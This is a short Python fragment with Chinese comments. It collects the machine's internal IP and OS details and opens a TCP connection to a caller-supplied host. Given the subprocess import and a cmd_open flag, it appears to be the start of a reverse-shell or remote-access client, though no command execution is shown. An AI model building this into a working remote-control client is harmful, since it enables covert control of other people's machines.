import socket
import os
import platform
from subprocess import run
import ast

global cmd_open
global intranet_ip
global operating_system
global c

cmd_open = False

def setup(host,port):
    global intranet_ip
    global operating_system
    global c

    # 获取内网地址
    ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip.connect(('8.8.8.8', 80))
    intranet_ip = ip.getsockname()[0] # 设置ip地址
    ip.close()

    # 获取系统信息
    operating_system = platform.platform()
    
    # 创建socket
    c = socket.socket()
    c.connect((host, port)) # 绑定host and port